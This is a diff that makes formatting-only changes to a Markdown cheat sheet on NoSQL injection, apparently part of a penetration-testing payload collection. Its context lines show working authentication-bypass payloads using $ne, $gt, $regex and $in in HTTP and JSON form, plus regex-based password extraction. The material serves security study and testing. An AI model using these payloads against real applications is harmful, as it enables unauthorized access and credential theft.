@@ -2,7 +2,6 @@
 
 > NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
 
-
 ## Summary
 
 * [Tools](#tools)
@@ -17,13 +16,11 @@
 * [Labs](#references)
 * [References](#references)
 
-
 ## Tools
 
 * [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
 * [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
-* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities. 
-
+* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.
 
 ## Methodology
 
@@ -32,6 +29,7 @@
 Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
 
 * in HTTP data
+
   ```ps1
   username[$ne]=toto&password[$ne]=toto
   login[$regex]=a.*&pass[$ne]=lol
@@ -40,13 +38,13 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   ```
 
 * in JSON data
+
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
   {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
   {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
   {"username": {"$gt":""}, "password": {"$gt":""}}
   ```
-
 
 ### Extract Length Information
 
@@ -62,6 +60,7 @@ username[$ne]=toto&password[$regex]=.{3}
 Extract data with "`$regex`" query operator.
 
 * HTTP data
+
   ```ps1
   username[$ne]=toto&password[$regex]=m.{2}
   username[$ne]=toto&password[$regex]=md.{1}
@@ -72,6 +71,7 @@ Extract data with "`$regex`" query operator.
   ```
 
 * JSON data
+
   ```json
   {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
   {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
@@ -83,7 +83,6 @@ Extract data with "`$in`" query operator.
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
-
 
 ## Blind NoSQL
 
@@ -191,18 +190,16 @@ while true
 end
 ```
 
-
 ## Labs
 
 * [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
 * [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)
 
-
 ## References
 
-- [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
-- [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
-- [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
-- [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
-- [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
-- [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
+* [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
+* [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
+* [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
+* [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
+* [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
